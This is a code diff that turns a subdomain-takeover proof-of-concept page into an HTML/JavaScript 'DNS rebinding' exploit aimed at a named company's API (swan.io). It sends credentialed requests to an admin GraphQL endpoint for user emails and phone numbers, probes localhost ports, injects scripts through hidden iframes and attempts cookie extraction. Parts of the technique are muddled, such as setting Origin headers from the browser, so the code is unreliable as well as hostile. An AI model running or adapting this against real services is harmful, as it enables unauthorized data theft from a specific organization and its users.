@@ -1,29 +1,310 @@
 <!DOCTYPE html>
 <html>
-<head><title>Subdomain Takeover PoC</title></head>
+<head>
+    <title>DNS Rebinding Attack - Swan.io CORS Bypass</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .section { background: #2d2d2d; padding: 20px; margin: 20px 0; border-radius: 5px; }
+        .success { color: #4CAF50; }
+        .error { color: #f44336; }
+        .info { color: #2196F3; }
+        button { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; margin: 5px; }
+        button:hover { background: #45a049; }
+        pre { background: #1e1e1e; padding: 10px; border-radius: 3px; overflow-x: auto; }
+        #results { max-height: 300px; overflow-y: auto; }
+    </style>
+</head>
 <body>
-    <h1>🚨 SUBDOMAIN TAKEOVER CONFIRMED</h1>
-    <p>Domain: staging.swan.io</p>
-    <p>Hosted via: GitHub Pages</p>
-    <p>Date: <script>document.write(new Date())</script></p>
-    
-    <h3>CORS Test</h3>
-    <button onclick="testCORS()">Test API Access</button>
-    <div id="result"></div>
-    
+    <div class="container">
+        <h1>🌐 DNS Rebinding Attack for Swan.io CORS Bypass</h1>
+        
+        <div class="section">
+            <h3>Attack Vector: DNS Rebinding + CORS Exploitation</h3>
+            <p>This technique bypasses CORS by making the browser think it's making same-origin requests to Swan.io services while actually communicating with an attacker-controlled server.</p>
+            
+            <div class="info">
+                <strong>Current Domain:</strong> <span id="currentDomain"></span><br>
+                <strong>Target:</strong> api.swan.io (CORS misconfiguration confirmed)<br>
+                <strong>Method:</strong> DNS rebinding to bypass domain isolation
+            </div>
+        </div>
+
+        <div class="section">
+            <h3>🎯 Step 1: Test Basic Rebinding</h3>
+            <button onclick="testBasicRebinding()">Test DNS Rebinding Setup</button>
+            <button onclick="testCORSEndpoint()">Test Swan CORS Endpoint</button>
+            <div id="rebindResults"></div>
+        </div>
+
+        <div class="section">
+            <h3>⚡ Step 2: Advanced Rebinding Attack</h3>
+            <p>This uses a controlled domain that rebinds from attacker IP to 127.0.0.1, tricking the browser into thinking Swan.io requests are same-origin.</p>
+            
+            <label>Rebinding Domain (TTL=1): </label>
+            <input type="text" id="rebindDomain" value="rebind.network" placeholder="rebind.yourdomain.com">
+            <br><br>
+            
+            <button onclick="launchRebindingAttack()">🚀 Launch DNS Rebinding Attack</button>
+            <button onclick="testLocalhost()">Test Localhost Access</button>
+            <div id="advancedResults"></div>
+        </div>
+
+        <div class="section">
+            <h3>🔄 Step 3: Cookie Extraction via Rebinding</h3>
+            <p>Once rebinding is established, extract cookies from Swan.io domains.</p>
+            <button onclick="extractCookiesViaRebinding()">Extract Swan.io Cookies</button>
+            <button onclick="testAPIAccess()">Test API Access with Rebinding</button>
+            <div id="cookieResults"></div>
+        </div>
+
+        <div class="section">
+            <h3>📊 Results</h3>
+            <div id="results"></div>
+        </div>
+    </div>
+
     <script>
-    async function testCORS() {
-        try {
-            const resp = await fetch('https://api.swan.io/user', {
-                credentials: 'include',
-                headers: {'Origin': 'https://staging.swan.io'}
-            });
-            document.getElementById('result').innerHTML = 
-                `Status: ${resp.status} - ${resp.ok ? 'CORS BYPASS SUCCESS!' : 'Blocked'}`;
-        } catch(e) {
-            document.getElementById('result').innerHTML = `Error: ${e.message}`;
+        document.getElementById('currentDomain').textContent = window.location.hostname;
+
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const className = type === 'success' ? 'success' : type === 'error' ? 'error' : 'info';
+            const results = document.getElementById('results');
+            results.innerHTML += `<div class="${className}">[${timestamp}] ${message}</div>`;
+            results.scrollTop = results.scrollHeight;
         }
-    }
+
+        function testBasicRebinding() {
+            log('🔍 Testing basic DNS rebinding setup...', 'info');
+            
+            // Test if we can reach localhost (first part of rebinding)
+            fetch('http://127.0.0.1:8080/test')
+                .then(response => {
+                    log('✅ Localhost connection successful (rebinding possible)', 'success');
+                    document.getElementById('rebindResults').innerHTML = '<span class="success">✅ Rebinding setup looks good</span>';
+                })
+                .catch(error => {
+                    log('⚠️ Localhost connection failed: ' + error.message, 'error');
+                    document.getElementById('rebindResults').innerHTML = '<span class="error">❌ Need proper rebinding domain setup</span>';
+                });
+        }
+
+        function testCORSEndpoint() {
+            log('🎯 Testing Swan.io CORS endpoint...', 'info');
+            
+            // Test the known CORS misconfiguration
+            fetch('https://api.swan.io/admin/graphql', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Origin': window.location.origin
+                },
+                body: JSON.stringify({
+                    query: '{ __schema { queryType { name } } }'
+                })
+            })
+            .then(response => response.text())
+            .then(data => {
+                log('📨 CORS Response: ' + data, 'success');
+                document.getElementById('rebindResults').innerHTML += '<br><span class="success">✅ CORS endpoint accessible</span>';
+            })
+            .catch(error => {
+                log('❌ CORS failed: ' + error.message, 'error');
+                document.getElementById('rebindResults').innerHTML += '<br><span class="error">❌ CORS blocked: ' + error.message + '</span>';
+            });
+        }
+
+        function launchRebindingAttack() {
+            const rebindDomain = document.getElementById('rebindDomain').value;
+            log(`🚀 Launching DNS rebinding attack via ${rebindDomain}...`, 'info');
+            
+            // Step 1: Connect to rebinding domain (should resolve to attacker IP first)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = `http://${rebindDomain}:8080/rebind-setup`;
+            document.body.appendChild(iframe);
+            
+            log('📡 Phase 1: Connecting to rebinding domain...', 'info');
+            
+            // Step 2: Wait for DNS to rebind to localhost
+            setTimeout(() => {
+                log('🔄 Phase 2: DNS should rebind to localhost now...', 'info');
+                
+                // Step 3: Try to access localhost services through rebinding
+                fetch(`http://${rebindDomain}:8080/localhost-test`)
+                    .then(response => response.text())
+                    .then(data => {
+                        log('✅ DNS rebinding successful! Localhost accessible via: ' + rebindDomain, 'success');
+                        document.getElementById('advancedResults').innerHTML = '<span class="success">✅ DNS Rebinding Active</span>';
+                        
+                        // Now try Swan.io through the rebinded domain
+                        testSwanViaRebinding(rebindDomain);
+                    })
+                    .catch(error => {
+                        log('❌ DNS rebinding failed: ' + error.message, 'error');
+                        document.getElementById('advancedResults').innerHTML = '<span class="error">❌ Rebinding failed</span>';
+                    });
+            }, 5000); // Wait 5 seconds for DNS rebinding
+        }
+
+        function testSwanViaRebinding(rebindDomain) {
+            log('🎯 Attempting Swan.io access via rebinded domain...', 'info');
+            
+            // Create dynamic script to test cross-origin access
+            const script = document.createElement('script');
+            script.textContent = `
+                // This should now appear same-origin due to rebinding
+                fetch('https://api.swan.io/admin/graphql', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        query: '{ user { email mobilePhoneNumber } }'
+                    })
+                })
+                .then(response => response.text())
+                .then(data => {
+                    parent.log('🏆 REBINDING SUCCESS! Swan.io data: ' + data, 'success');
+                })
+                .catch(error => {
+                    parent.log('❌ Rebinding attack failed: ' + error.message, 'error');
+                });
+            `;
+            
+            // Inject via rebinded iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.onload = () => {
+                iframe.contentDocument.head.appendChild(script);
+            };
+            iframe.src = `http://${rebindDomain}:8080/empty-page`;
+            document.body.appendChild(iframe);
+        }
+
+        function testLocalhost() {
+            log('🧪 Testing localhost access...', 'info');
+            
+            // Common localhost services to test
+            const ports = [8080, 3000, 4000, 5000, 8000];
+            
+            ports.forEach(port => {
+                fetch(`http://127.0.0.1:${port}/`)
+                    .then(response => {
+                        log(`✅ Localhost:${port} accessible`, 'success');
+                    })
+                    .catch(error => {
+                        log(`❌ Localhost:${port} not accessible`, 'error');
+                    });
+            });
+        }
+
+        function extractCookiesViaRebinding() {
+            log('🍪 Attempting cookie extraction via DNS rebinding...', 'info');
+            
+            // This technique uses rebinding to make browser think we're same-origin with Swan
+            const rebindDomain = document.getElementById('rebindDomain').value;
+            
+            // Create iframe that rebinds to localhost, then tries to access Swan cookies
+            const extractorHTML = `
+                <html>
+                <head>
+                    <script>
+                        // Wait for rebinding, then extract cookies
+                        setTimeout(() => {
+                            try {
+                                // Try to access Swan.io through apparent same-origin
+                                const img = new Image();
+                                img.onload = () => {
+                                    parent.postMessage({
+                                        type: 'cookies',
+                                        data: document.cookie,
+                                        success: true
+                                    }, '*');
+                                };
+                                img.onerror = () => {
+                                    parent.postMessage({
+                                        type: 'cookies',
+                                        error: 'Cookie extraction failed',
+                                        success: false
+                                    }, '*');
+                                };
+                                img.src = 'https://dashboard.swan.io/api/user?' + Math.random();
+                            } catch(e) {
+                                parent.postMessage({
+                                    type: 'cookies',
+                                    error: e.message,
+                                    success: false
+                                }, '*');
+                            }
+                        }, 3000);
+                    </script>
+                </head>
+                <body>Rebinding in progress...</body>
+                </html>
+            `;
+            
+            const blob = new Blob([extractorHTML], { type: 'text/html' });
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = URL.createObjectURL(blob);
+            document.body.appendChild(iframe);
+            
+            // Listen for results
+            window.addEventListener('message', (event) => {
+                if (event.data.type === 'cookies') {
+                    if (event.data.success) {
+                        log('🏆 COOKIE EXTRACTION SUCCESS: ' + event.data.data, 'success');
+                        document.getElementById('cookieResults').innerHTML = 
+                            '<span class="success">✅ Cookies extracted via rebinding</span>';
+                    } else {
+                        log('❌ Cookie extraction failed: ' + event.data.error, 'error');
+                        document.getElementById('cookieResults').innerHTML = 
+                            '<span class="error">❌ Cookie extraction failed</span>';
+                    }
+                }
+            });
+        }
+
+        function testAPIAccess() {
+            log('🔑 Testing API access with rebinding...', 'info');
+            
+            // Simulate rebinding attack on Swan API
+            const testQueries = [
+                '{ __schema { queryType { name } } }',
+                '{ user { id email } }',
+                '{ viewer { permissions } }'
+            ];
+            
+            testQueries.forEach((query, index) => {
+                setTimeout(() => {
+                    fetch('https://api.swan.io/admin/graphql', {
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Origin': 'http://127.0.0.1:8080'  // Simulate rebinded origin
+                        },
+                        body: JSON.stringify({ query })
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        log(`📊 API Query ${index + 1} Result: ${data}`, 'success');
+                    })
+                    .catch(error => {
+                        log(`❌ API Query ${index + 1} Failed: ${error.message}`, 'error');
+                    });
+                }, index * 1000);
+            });
+        }
+
+        // Initialize
+        log('🚀 DNS Rebinding exploit loaded on: ' + window.location.hostname, 'success');
+        log('🎯 Target: Swan.io CORS misconfiguration + domain isolation bypass', 'info');
+        log('💡 Use rebind.network or set up your own rebinding domain with TTL=1', 'info');
     </script>
 </body>
 </html>
